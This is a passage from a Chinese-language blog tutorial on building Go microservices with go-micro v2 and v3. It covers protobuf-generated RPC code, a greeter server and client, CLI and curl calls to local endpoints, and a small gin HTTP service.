class="keyword">func</span> <span class="params">(c *greeterService)</span> <span class="title">Greet</span><span class="params">(ctx context.Context, in *Request, opts ...client.CallOption)</span> <span class="params">(*Response, error)</span></span> &#123;</span><br><span class="line">req := c.c.NewRequest(c.name, <span class="string">&quot;Greeter.Greet&quot;</span>, in)</span><br><span class="line">out := <span class="built_in">new</span>(Response)</span><br><span class="line">err := c.c.Call(ctx, req, out, opts...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> out, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Server API for Greeter service</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GreeterHandler <span class="keyword">interface</span> &#123;</span><br><span class="line">Greet(context.Context, *Request, *Response) error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterGreeterHandler</span><span class="params">(s server.Server, hdlr GreeterHandler, opts ...server.HandlerOption)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">type</span> greeter <span class="keyword">interface</span> &#123;</span><br><span class="line">Greet(ctx context.Context, in *Request, out *Response) error</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Greeter <span class="keyword">struct</span> &#123;</span><br><span class="line">greeter</span><br><span class="line">&#125;</span><br><span class="line">h := &amp;greeterHandler&#123;hdlr&#125;</span><br><span class="line"><span class="keyword">return</span> s.Handle(s.NewHandler(&amp;Greeter&#123;h&#125;, opts...))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> greeterHandler <span class="keyword">struct</span> &#123;</span><br><span class="line">GreeterHandler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *greeterHandler)</span> <span class="title">Greet</span><span class="params">(ctx context.Context, in *Request, out *Response)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> h.GreeterHandler.Greet(ctx, in, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个文件里定义了服务结构体GreeterService，RPC函数实现Greet。</p><p>现在先编写服务端代码micro_server/main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">    micro <span class="string">&quot;github.com/micro/go-micro/v2&quot;</span></span><br><span class="line">    proto <span class="string">&quot;web_demo/proto/pb/proto_demo&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Greeter <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Greeter)</span> <span class="title">Greet</span><span class="params">(ctx context.Context, req *proto.Request, rsp *proto.Response)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">rsp.Msg = <span class="string">&quot;Greet &quot;</span> + req.Name</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个新服务</span></span><br><span class="line">    service := micro.NewService(</span><br><span class="line">        micro.Name(<span class="string">&quot;greeter&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 服务初始化</span></span><br><span class="line">    service.Init()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册 handler处理函数</span></span><br><span class="line">    proto.RegisterGreeterHandler(service.Server(), <span class="built_in">new</span>(Greeter))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动服务</span></span><br><span class="line">    <span class="keyword">if</span> err := service.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写客户端micro_client/main.go，客户端向服务器发起RPC调用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">    micro <span class="string">&quot;github.com/micro/go-micro/v2&quot;</span></span><br><span class="line">    proto  <span class="string">&quot;web_demo/proto/pb/proto_demo&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建新服务</span></span><br><span class="line">    service := micro.NewService(micro.Name(<span class="string">&quot;greeter.client&quot;</span>))</span><br><span class="line">    <span class="comment">// 服务初始化</span></span><br><span class="line">    service.Init()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建RPC的客户端实例</span></span><br><span class="line">    greeter := proto.NewGreeterService(<span class="string">&quot;greeter&quot;</span>, service.Client())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发起RPC调用</span></span><br><span class="line">    rsp, err := greeter.Greet(context.TODO(), &amp;proto.Request&#123;Name: <span class="string">&quot;John&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印返回值</span></span><br><span class="line">    fmt.Println(rsp.Msg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先启动server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unshideMacBook-Pro:micro_server junshili$ go run main.go </span><br><span class="line">2021-05-07 00:50:11  file&#x3D;v2@v2.9.1&#x2F;service.go:200 level&#x3D;info Starting [service] greeter</span><br><span class="line">2021-05-07 00:50:11  file&#x3D;grpc&#x2F;grpc.go:864 level&#x3D;info Server [grpc] Listening on [::]:56014</span><br><span class="line">2021-05-07 00:50:11  file&#x3D;grpc&#x2F;grpc.go:697 level&#x3D;info Registry [mdns] Registering node: greeter-147bbaba-7f7e-46af-bb5e-81d311da0d1a</span><br></pre></td></tr></table></figure><p>当然，我们也可以指定端口启动服务，这个参数传入的端口是优先于代码设置的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go --server_address :8088</span><br></pre></td></tr></table></figure><p>我们可以从服务器启动时打印的这些日志得到一些信息：</p><ol><li>RPC通信框架用的是gRPC，这是go-mico默认的；</li><li>我们启动的这个服务的名字叫greeter;</li><li>服务监听的端口是56014;</li><li>服务发现用的组件是mdns，这是go-mirco默认的;</li></ol><p>我们也可以指定端口号来启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:micro_server junshili$ go run main.go --server_address :8088</span><br><span class="line">2021-05-07 01:38:25  file&#x3D;v2@v2.9.1&#x2F;service.go:200 level&#x3D;info Starting [service] greeter</span><br><span class="line">2021-05-07 01:38:25  file&#x3D;grpc&#x2F;grpc.go:864 level&#x3D;info Server [grpc] Listening on [::]:8088</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再启动client发起RPC调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:micro_client junshili$ go run main.go </span><br><span class="line">Greet John</span><br></pre></td></tr></table></figure><p>当我kill掉server时，会打印以下日志，表明：1.服务从服务发现组件注销注册了；2.Broker和该服务断开了连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2021-05-07 01:32:38  file&#x3D;grpc&#x2F;grpc.go:791 level&#x3D;info Deregistering node: greeter-5e32cdd2-4099-4ee9-b2df-bdeee2cd5ff4</span><br><span class="line">2021-05-07 01:32:38  file&#x3D;grpc&#x2F;grpc.go:959 level&#x3D;info Broker [http] Disconnected from 127.0.0.1:0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，使用micro/v2时,protoc3生成micro.protoc文件可能会导致版本冲突，在go run main.go时会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用micro&#x2F;v2时,protoc3生成micro.protoc文件导致的版本冲突</span><br><span class="line">cannot use service.Server() (type</span><br><span class="line">“github.com&#x2F;micro&#x2F;go-micro&#x2F;v2&#x2F;server”.Server) as type</span><br><span class="line">“github.com&#x2F;micro&#x2F;micro&#x2F;v3&#x2F;service&#x2F;server”</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解决方案：<br>可将生成的*.pb.micro.go文件中的v3依赖改为v2依赖即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import ( </span><br><span class="line"> context &quot;context&quot; </span><br><span class="line">client &quot;github.com&#x2F;micro&#x2F;go-micro&#x2F;v2&#x2F;client&quot;</span><br><span class="line"> server &quot;github.com&#x2F;micro&#x2F;go-micro&#x2F;v2&#x2F;server&quot;</span><br><span class="line">api &quot;github.com&#x2F;micro&#x2F;micro&#x2F;v3&#x2F;service&#x2F;api&quot; </span><br><span class="line"> )</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="新建服务-基于micro-v3"><a href="#新建服务-基于micro-v3" class="headerlink" title="新建服务 (基于micro v3)"></a>新建服务 (基于micro v3)</h2><p>现在go micro已经推出了V3版本，因为V3和V2版本有较多的不同，且存在兼容性不足的问题。下面的所有例子都是基于V3的实践。</p><p>首先给出官方的上手文档:<a href="https://micro.mu/getting-started">https://micro.mu/getting-started</a></p><p>首先安装/升级自己的micro版本至V3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com&#x2F;micro&#x2F;micro&#x2F;v3</span><br></pre></td></tr></table></figure><p>安装完之后，启动micro相关的服务进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:~ junshili$ micro server</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:86 level&#x3D;info Starting server</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering network</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering runtime</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering registry</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering config</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering store</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering broker</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering events</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering auth</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering proxy</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:114 level&#x3D;info Registering api</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;server&#x2F;server.go:201 level&#x3D;info Starting server runtime</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;service&#x2F;service.go:195 level&#x3D;info Starting [service] server</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;grpc&#x2F;grpc.go:939 level&#x3D;info Server [grpc] Listening on [::]:10001</span><br><span class="line">2021-05-09 00:32:01  file&#x3D;grpc&#x2F;grpc.go:769 level&#x3D;info Registry [mdns] Registering node: server-fc07e464-99c4-406d-b608-b54ef3c9bdde</span><br></pre></td></tr></table></figure><p>可以注意到，registry,auth等Micro组件都启动起来了。与V2版本不一样的是，接下来需要登录账号，做身份验证。这一步很重要，不然没有登录，后续操作micro会提示权限不足。username固定为admin,password固定为micro。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ micro login</span><br><span class="line">Enter username: admin</span><br><span class="line">Enter password:</span><br><span class="line">Successfully logged in.</span><br></pre></td></tr></table></figure><p>查看micro框架下跑着哪些服务，可以看到这些服务都是micro框架自带的，在我们执行micro server时启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:~ junshili$ micro services</span><br><span class="line">api</span><br><span class="line">auth</span><br><span class="line">broker</span><br><span class="line">config</span><br><span class="line">events</span><br><span class="line">network</span><br><span class="line">proxy</span><br><span class="line">registry</span><br><span class="line">runtime</span><br><span class="line">server</span><br><span class="line">store</span><br></pre></td></tr></table></figure><p>现在我们打算启动一个自己的服务，micro v3提供了一个非常好用的服务生成工具，可以帮我们直接生成服务模板，我们只需要在模板上增添自己的内容就可以了，生产效率大幅提升。使用<strong>micro new 服务名</strong>就可以生成模板代码。<strong>服务名不要使用下划线</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:~ junshili$ micro new hellodemo</span><br><span class="line">Creating service hellodemo</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">├── micro.mu</span><br><span class="line">├── main.go</span><br><span class="line">├── generate.go</span><br><span class="line">├── handler</span><br><span class="line">│   └── hellodemo.go</span><br><span class="line">├── proto</span><br><span class="line">│   └── hellodemo.proto</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── Makefile</span><br><span class="line">├── README.md</span><br><span class="line">├── .gitignore</span><br><span class="line">└── go.mod</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进入项目目录，编译协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:hellodemo junshili$ make proto</span><br><span class="line">protoc --proto_path&#x3D;. --micro_out&#x3D;. --go_out&#x3D;:. proto&#x2F;hellodemo.proto</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在proto目录下自动生成了<em>pb.go和</em>.pb.micro.go的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;hellodemo&#x2F;</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── Makefile</span><br><span class="line">├── README.md</span><br><span class="line">├── generate.go</span><br><span class="line">├── go.mod</span><br><span class="line">├── handler</span><br><span class="line">│   └── hellodemo.go</span><br><span class="line">├── main.go</span><br><span class="line">├── micro.mu</span><br><span class="line">└── proto</span><br><span class="line">    ├── hellodemo.pb.go</span><br><span class="line">    ├── hellodemo.pb.micro.go</span><br><span class="line">    └── hellodemo.proto</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动我们的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro run .</span><br></pre></td></tr></table></figure><p>查看我们的服务是否正常启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro services</span><br><span class="line">api</span><br><span class="line">auth</span><br><span class="line">broker</span><br><span class="line">config</span><br><span class="line">events</span><br><span class="line">hellodemo</span><br><span class="line">network</span><br><span class="line">proxy</span><br><span class="line">registry</span><br><span class="line">runtime</span><br><span class="line">server</span><br><span class="line">store</span><br><span class="line"></span><br><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro status</span><br><span class="line">NAMEVERSIONSOURCESTATUSBUILDUPDATEDMETADATA</span><br><span class="line">hellodemolatest&#x2F;Users&#x2F;junshili&#x2F;hellodemorunningn&#x2F;a1m58s agoowner&#x3D;admin, group&#x3D;micro</span><br></pre></td></tr></table></figure><p>可以看到，我们的服务正常运行在micro框架之内。现在我们要基于这个服务模板做点自己的修改。</p><p>现在协议文件上增加rpc 函数和消息结构体。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">service Hellodemo &#123;</span><br><span class="line">rpc Call(Request) returns (Response) &#123;&#125;</span><br><span class="line">rpc Stream(StreamingRequest) returns (stream StreamingResponse) &#123;&#125;</span><br><span class="line">rpc PingPong(stream Ping) returns (stream Pong) &#123;&#125;</span><br><span class="line">rpc Greet(GreetReq) returns (GreetRsp) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message GreetReq &#123;</span><br><span class="line">string name &#x3D; 1;</span><br><span class="line">int32 age &#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message GreetRsp &#123;</span><br><span class="line">string msg &#x3D; 1;</span><br><span class="line">int32 status &#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再到在handler/hellodemo.go这个文件里，加一个自己的Greet的实现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Hellodemo)</span> <span class="title">Greet</span><span class="params">(ctx context.Context, req *hellodemo.GreetReq, rsp *hellodemo.GreetRsp)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">log.Info(<span class="string">&quot;Received Hellodemo.Greet request&quot;</span>)</span><br><span class="line">rsp.Msg = fmt.Sprintf(<span class="string">&quot;Greet %s, your age is %d&quot;</span>, req.Name, req.Age) </span><br><span class="line">rsp.Status = <span class="number">200</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的功能代码已经完成编写，准备把服务更新一下，因为服务已经在run了，所以我们直接使用<code>micro update .</code>把服务更出去，类似于我们常用的热更，不停服更新。<br>然后用<code>micro logs hellodemo</code>看下输出日志是否正常。确认启动正常后，我们可以使用micro框架cli给该服务直接发送请求，测试服务可用性，而无须再写测试client。</p><p>先用help指令查看hellodemo对外提供了哪些可调用的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro  hellodemo  --help</span><br><span class="line">NAME:</span><br><span class="line">micro hellodemo</span><br><span class="line"></span><br><span class="line">VERSION:</span><br><span class="line">latest</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">micro hellodemo [command]</span><br><span class="line"></span><br><span class="line">COMMANDS:</span><br><span class="line">call</span><br><span class="line">greet</span><br><span class="line">pingPong</span><br><span class="line">stream</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们测试下call和greet方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro  hellodemo  call  --name&#x3D;James</span><br><span class="line">&#123;</span><br><span class="line">&quot;msg&quot;: &quot;Hello James&quot;</span><br><span class="line">&#125;</span><br><span class="line">junshideMacBook-Pro:hellodemo junshili$ micro  hellodemo  greet --name&#x3D;James --age&#x3D;20</span><br><span class="line">&#123;</span><br><span class="line">&quot;msg&quot;: &quot;Greet James, your age is 20&quot;,</span><br><span class="line">&quot;status&quot;: 200</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们同样可以通过http的方式访问请求RPC，中介是micro的api服务，请求会通过api服务，再调到我们制定的服务。默认API的address是127.0.0.1:8080。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:helloworld junshili$ curl -XPOST --header &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;&quot;name&quot;:&quot;Joe&quot;, &quot;age&quot;:30&#125;&#39; http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;hellodemo&#x2F;greet</span><br><span class="line">&#123;&quot;msg&quot;:&quot;Greet Joe, your age is 30&quot;,&quot;status&quot;:200&#125;</span><br></pre></td></tr></table></figure><h2 id="搭建Http服务"><a href="#搭建Http服务" class="headerlink" title="搭建Http服务"></a>搭建Http服务</h2><p>上面介绍了搭建RPC服务的流程，如果要搭建HTTP服务，其实跟上面流程一样，区别只在于在main.go中调用http相关相关处理即可，比如我们使用gin来实现我们的http服务。</p><p>第一步先micro new helloweb，创建服务模板，然后我们之间在main.go添加http处理的相关代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HelloWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Hello, Go\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HiWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Hi, Go\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用gin作为路由</span></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">HelloWeb(c)</span><br><span class="line">&#125;)</span><br><span class="line">r.POST(<span class="string">&quot;/hi&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">HiWeb(c)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:9999&quot;</span>) <span class="comment">//  listen and serve on 0.0.0.0:9999</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>请求和响应如下，如果想要构建更复杂的http项目，请参考我的上一篇文章:<a href="https://astarlight.github.io/2021/05/05/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AF%87/">Go快速上手—Web服务器篇.</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:blog junshili$ curl -X POST http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;hi</span><br><span class="line">Hi, Go</span><br><span class="line">junshideMacBook-Pro:blog junshili$ curl http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;hello</span><br><span class="line">Hello, Go</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要kill掉这个服务，需要使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">micro kill example</span><br></pre></td></tr></table></figure><h2 id="发布订阅-基于消息队列的异步通信"><a href="#发布订阅-基于消息队列的异步通信" class="headerlink" title="发布订阅(基于消息队列的异步通信)"></a>发布订阅(基于消息队列的异步通信)</h2><p>发布订阅模式在后台服务中广泛使用，go 